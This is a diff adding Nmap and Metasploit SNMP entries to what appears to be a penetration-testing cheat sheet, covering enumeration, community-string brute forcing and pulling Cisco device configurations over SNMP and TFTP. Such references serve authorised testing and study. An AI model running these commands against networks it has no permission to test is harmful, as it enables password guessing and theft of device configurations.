@@ -21,6 +21,20 @@ snmp port | udp.port == 161
 snmp traps | udp.port == 162  
 snmp + tftp (config exfil) | snmp || tftp  
 
+## Nmap (SNMP)  
+
+snmp enumeration | nmap -sU -p 161 --script snmp-info <target>  
+snmp brute force | nmap -sU -p 161 --script snmp-brute <target>  
+snmp config pull | sudo nmap -sU -p 161 --script snmp-ios-config --script-args creds.snmp=:<community> <target>  
+
+## Metasploit (SNMP)  
+
+start metasploit | msfconsole  
+snmp enumeration | use auxiliary/scanner/snmp/snmp_enum; set RHOSTS <target>; run  
+snmp brute force | use auxiliary/scanner/snmp/snmp_login; set RHOSTS <target>; run  
+snmp config via tftp | use auxiliary/scanner/snmp/cisco_config_tftp; set RHOSTS <target>; set COMMUNITY <community>; set OUTPUTDIR /tmp; run  
+
+
 ## DHCP / Network Attacks
 
 dhcp traffic | dhcp  
